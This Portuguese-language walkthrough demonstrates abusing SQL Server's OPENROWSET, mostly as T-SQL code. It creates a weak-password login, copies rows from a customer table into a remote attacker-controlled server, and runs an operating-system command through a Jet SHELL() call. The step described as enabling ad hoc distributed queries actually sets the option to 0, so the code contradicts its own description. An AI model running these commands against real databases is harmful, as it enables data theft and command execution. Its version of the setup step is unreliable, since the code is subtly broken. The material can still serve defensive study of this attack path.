### Descrição do Script:

Este script é um exemplo de como realizar a criação de usuários e manipulação de dados de forma maliciosa em um ambiente de banco de dados SQL Server.

1. **Criação de Tabela e Dados Falsos**: 
   - Cria a tabela `dbo.Hacked_Clientes` e insere um campo `Nome` para armazenar dados que podem ser utilizados em um ataque.

2. **Configuração para Execução de Consultas Distribuídas**: 
   - O script habilita a configuração `Ad hoc distributed queries` no SQL Server (para testes, mas não recomendado em ambientes de produção), permitindo consultas distribuídas via OLE DB.

3. **Criação de Login e Usuário Malicioso**: 
   - Cria um login (`teste_openrowset`) e um usuário associado no banco de dados `dirceuresende`, além de conceder permissões de leitura ao banco (`db_datareader`).

4. **Execução de Consultas Maliciosas**: 
   - O script simula um ataque onde o usuário malicioso consulta dados da tabela `dbo.Clientes` e os insere na tabela `dbo.Hacked_Clientes`. Ele também executa comandos maliciosos via `OPENROWSET` para acessar dados de outras fontes externas e até executar comandos no sistema operacional.

5. **Desabilitação de Configuração de Consultas Distribuídas**: 
   - Após a execução do ataque, o script desabilita a configuração de `Ad hoc distributed queries`, seguindo as boas práticas de segurança para evitar consultas maliciosas futuras.

´´´SQL
----------------------------------------------------------------------------------------------------
--------------------------- cria os dados no "ambiente do atacante" --------------------------------
----------------------------------------------------------------------------------------------------

CREATE TABLE dbo.Hacked_Clientes (
	Nome VARCHAR(100)
)

SELECT * FROM dbo.Hacked_Clientes
´´´

´´´SQL
----------------------------------------------------------------------------------------------------
---------------------------- de volta ao ambiente que será atacado ---------------------------------
----------------------------------------------------------------------------------------------------

-- Habilitar a configuração "Ad hoc distributed queries" (para testes apenas - não recomendado)
sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO

sp_configure 'Ad hoc distributed queries', 0
GO

RECONFIGURE
GO


-- Cria o login
CREATE LOGIN [teste_openrowset] WITH PASSWORD = 'aaa', CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF, DEFAULT_DATABASE=master
GO

USE [dirceuresende]
GO

CREATE USER [teste_openrowset] FOR LOGIN [teste_openrowset]
GO

ALTER ROLE [db_datareader] ADD MEMBER [teste_openrowset]
GO
´´´

´´´SQL
----------------------------------------------------------------------------------------------------
---------------------------- logado com o usuário teste_openrowset ---------------------------------
----------------------------------------------------------------------------------------------------

USE [DB]
GO

-- Identifico os dados que quero "roubar"
SELECT TOP 100 Nome FROM dbo.Clientes

-- Roubo os dados e insiro no meu banco "malicioso"
INSERT INTO OPENROWSET('SQLOLEDB', 'server=sqlserver,1438;uid=dirceu;pwd=aaa', 'SELECT TOP 100 Nome FROM dbo.Hacked_Clientes')
SELECT TOP 100 Nome
FROM dbo.Clientes

-- Posso usar também para executar o que eu quiser
SELECT * 
FROM OPENROWSET('SQLOLEDB', 'Database=C:\Windows\system32\ias\ias.mdb', 'SELECT SHELL(""cmd /c echo open 192.168.0.1 > teste.dat"")')
´´´

´´´SQL
----------------------------------------------------------------------------------------------------
---------------------------- logado com um usuário sysadmin ---------------------------------
----------------------------------------------------------------------------------------------------

-- Desabilitar a configuração "Ad hoc distributed queries" (boa prática de segurança)
sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO

sp_configure 'Ad hoc distributed queries', 0
GO

RECONFIGURE
GO
´´´